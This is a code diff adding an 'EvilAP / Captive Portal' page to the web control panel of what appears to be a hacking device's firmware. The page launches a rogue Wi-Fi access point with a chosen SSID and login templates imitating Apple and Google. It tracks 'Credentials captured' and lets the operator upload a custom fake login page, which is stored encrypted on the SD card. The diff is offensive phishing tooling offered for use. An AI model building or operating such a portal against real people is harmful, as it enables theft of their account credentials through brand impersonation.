@@ -620,6 +620,57 @@ async function refreshLocks(){
   }catch(e){}
 }
 
+/* ============================= EVILAP VIEW ============================= */
+let evilTimer=null, TPLS=["Generic WiFi","Apple","Google"];
+function evilapView(){
+  clearInterval(evilTimer);
+  view.innerHTML=`<div class="panel"><h2>EvilAP / Captive Portal</h2>
+   <p class="err">Starting replaces your management AP until stopped. Stop via this page, http://portal-ip/disable, or holding BOOT ~1.5s.</p>
+   <label>Portal SSID<input id="evilSsid" placeholder="Free WiFi"></label>
+   <label>Template<select id="evilTpl">${TPLS.map(t=>`<option>${t}</option>`).join("")}</select></label>
+   <div style="display:flex;gap:8px">
+     <button class="danger" id="evilStartBtn" onclick="evilStart()">Start EvilAP</button>
+     <button class="small" id="evilStopBtn" style="display:none" onclick="api('/api/evilap/stop',{method:'POST'})">Stop</button>
+   </div></div>
+  <div class="panel"><h2>Stats</h2><table><tr><td>Portal hits</td><td id="eHits">-</td></tr>
+   <tr><td>Credentials captured</td><td id="eCaps">-</td></tr></table></div>
+  <div class="panel"><h2>Custom Portal Page</h2>
+   <p class="muted">Stored encrypted as /portal.html.enc on the SD card. Overrides any template.</p>
+   <textarea id="evilHtml" rows="12" style="font-family:'Courier New',monospace" placeholder="<html>...custom login page..."></textarea>
+   <div class="row-end" style="margin-top:8px">
+     <button class="small" onclick="loadEvilHtml()">Load current</button>
+     <button class="small" onclick="saveEvilHtml()">Save page</button>
+     <button class="small danger" onclick="clearEvilHtml()">Remove custom page</button>
+   </div></div>`;
+  refreshEvil(); evilTimer=setInterval(refreshEvil,3000);
+}
+async function refreshEvil(){
+  try{ const s=await api("/api/evilap/status");
+    $("#eHits").textContent=s.hits; $("#eCaps").textContent=s.captures;
+    $("#evilStartBtn").style.display=s.running?"none":"";
+    $("#evilStopBtn").style.display=s.running?"":"none";
+  }catch(e){}
+}
+async function evilStart(){
+  const ssid=$("#evilSsid").value.trim(); if(!ssid)return toast("Enter an SSID","err");
+  if(!(await confirmModal("Start EvilAP '"+ssid+"'?\nYour management AP will be replaced until you stop it.")))return;
+  await jpost("/api/evilap/start",{ssid,template:$("#evilTpl").value});
+  toast("EvilAP started"); refreshEvil();
+}
+async function loadEvilHtml(){
+  const t=await fetch("/api/evilap/html").then(r=>r.text());
+  $("#evilHtml").value=t.replace(/\r\n?/g,"\n"); toast("Loaded custom page");
+}
+async function saveEvilHtml(){
+  await jpost("/api/evilap/html",{content:$("#evilHtml").value});
+  toast("Custom portal page saved");
+}
+async function clearEvilHtml(){
+  if(!(await confirmModal("Remove custom page (fall back to template)?")))return;
+  await jpost("/api/evilap/html",{content:""});
+  $("#evilHtml").value=""; toast("Custom page removed");
+}
+
 /* ============================== ROUTER ================================ */
 function route(){
   clearInterval(statusTimer);
@@ -627,6 +678,7 @@ function route(){
   document.querySelectorAll("nav a").forEach(a=>a.classList.toggle("active",a.getAttribute("href")===h));
   if(h==="#files")filesView();
   else if(h==="#control")controlView();
+  else if(h==="#evilap")evilapView();
   else if(h==="#reference")refView();
   else if(h==="#status")statusView();
   else if(h==="#settings")settingsView();
